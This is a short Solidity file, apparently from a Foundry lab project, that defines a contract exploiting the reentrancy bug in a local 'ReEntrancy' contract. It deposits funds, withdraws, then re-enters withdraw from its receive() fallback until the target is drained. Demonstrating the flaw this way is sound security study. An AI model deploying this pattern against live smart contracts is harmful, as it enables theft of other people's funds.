// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ReEntrancy} from "./ReEntrancy.sol";

contract ReentrancyAttack {
    address public owner;

    ReEntrancy reentrancyattack;

    constructor(ReEntrancy _contractaddress) {
        reentrancyattack = ReEntrancy(_contractaddress);
        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        reentrancyattack.deposit{value: amount}();

        reentrancyattack.withdraw(amount);
    }

    receive() external payable {
        if (address(reentrancyattack).balance > 0) {
            reentrancyattack.withdraw(1 ether);
        }
    }
}
